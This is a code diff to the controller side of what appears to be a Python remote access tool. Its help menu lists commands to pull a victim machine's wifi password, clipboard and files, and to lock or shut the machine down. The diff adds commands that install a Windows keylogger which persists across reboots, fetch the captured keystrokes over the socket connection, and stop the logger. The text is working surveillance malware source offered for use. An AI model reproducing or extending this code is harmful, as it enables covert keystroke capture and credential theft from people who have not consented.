@@ -83,10 +83,10 @@ def login():
             print(bcolors.RED + logfail)
 
 def help():
-    print(bcolors.YELLOW + '[+] Type pipins to install a python module\n[+] Type quit to end the session\n[+] Type pubip'
+    print(bcolors.YELLOW + '\n\n[+] Type pipins to install a python module\n[+] Type quit to end the session\n[+] Type pubip'
                            ' to see the clients public IP address\n[+] Type shutdown to shutdown client and type cshutdo'
                            'wn to cancel\n[+] Type wifi pass to get the wifi '
-                           'password of the client machine\n[+] Type download\n[+] Type speak "any text that you want the client computer to speak\n[+] Type "lock" (without the quotes) to lock the users computer (They will still be able to unlock it by entering their password as normal)\n[+] Type "clipboard get" (without the quotes) to get the current clipboard of the client)"')
+                           'password of the client machine\n[+] Type download\n[+] Type speak "any text that you want the client computer to speak\n[+] Type "lock" (without the quotes) to lock the users computer (They will still be able to unlock it by entering their password as normal)\n[+] Type "clipboard get" (without the quotes) to get the current clipboard of the client)\n\n-------------------------KEYLOGGER (ONLY FOR WINDOWS)------------------------\n[+] Type "keylogger start" (without quotes) to start a keylogger on the client computer\n\t\tIt will be executed on their PC everytime it starts up\n[+] Type "keylogger get" to get the captured keystrokes on the client computer\n[+] Type "keylogger end" to stop running the keylogger on the client computer\n"')
 
 
 
@@ -110,6 +110,7 @@ def send_commands():
                 bcolors.GREEN + "File Received! " + "What would you like to name this file: ")
             with open(received_path, "wb") as file:
                 file.write(file_content)
+                file.close()
 
         if lcmd == "quit":
             quit()
@@ -160,7 +161,33 @@ def send_commands():
             conn.send(str.encode(lcmd))
             clipboard = conn.recv(99999).decode("unicode_escape")[2:-1]
             print(clipboard)
-        if lcmd != "help" and "speak " not in lcmd and wallow == 0 and lcmd != "clipboard get":
+        elif lcmd == "keylogger start":
+            conn.send(str.encode(lcmd))
+            keylogger_start_response = str(conn.recv(99999), "utf-8")
+            if keylogger_start_response == "exists":
+                print(bcolors.RED + '[-] Keylogger already exsists. Type "keylogger reset" to restart the keylogger log')
+            else:
+                print(bcolors.GREEN + "[+] Keylogger has been created!\n")
+        elif lcmd == "keylogger get":
+            conn.send(str.encode(lcmd))
+            keylogger_get_response = str(conn.recv(99999), "utf-8")
+            if keylogger_get_response == "nan":
+                print(bcolors.RED + '[-] Keylogger does not exsists. Type "keylogger start" to start a keylogger')
+            else:
+                file_content = str(conn.recv(99999), "utf-8")
+                # file_content = bytes(file_content, encoding='utf8')
+                with open("logs.txt", "w") as e:
+                    e.write(file_content)
+                    e.close()
+                print(bcolors.GREEN + "[+] Log has been recieved!\n")
+        elif lcmd == "keylogger end":
+            conn.send(str.encode(lcmd))
+            keylogger_end_response = str(conn.recv(99999), "utf-8")
+            if keylogger_end_response == "nan":
+                print(bcolors.RED + '[-] Keylogger does not exsist')
+            else:
+                print(bcolors.GREEN + "[+] Keylogger has been terminated!\n")
+        if lcmd != "help" and "speak " not in lcmd and wallow == 0 and lcmd != "clipboard get" and lcmd != "keylogger get" and lcmd != "keylogger start" and lcmd != "keylogger end" and lcmd != "keylogger reset":
             if lcmd == "download":
                 download_files()
 
